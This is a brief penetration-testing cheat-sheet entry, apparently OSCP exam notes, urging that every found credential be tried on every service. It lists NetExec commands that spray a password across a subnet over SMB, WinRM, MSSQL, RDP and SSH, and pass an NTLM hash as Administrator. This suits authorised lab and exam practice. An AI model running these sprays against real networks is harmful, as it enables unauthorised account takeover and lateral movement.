
**Rule:** Every credential found anywhere must be tried on every service everywhere. Password reuse wins OSCP.

```
# Any creds found → spray everything:
nxc smb 192.168.x.0/24 -u user -p pass --continue-on-success
nxc winrm 192.168.x.0/24 -u user -p pass --continue-on-success
nxc mssql 192.168.x.0/24 -u user -p pass --continue-on-success
nxc rdp 192.168.x.0/24 -u user -p pass --continue-on-success
nxc ssh 192.168.x.0/24 -u user -p pass --continue-on-success

# After getting any hash → spray hash across subnet:
nxc smb 192.168.x.0/24 -u Administrator -H <NTLM_HASH> \
    --local-auth --continue-on-success | grep "+"
```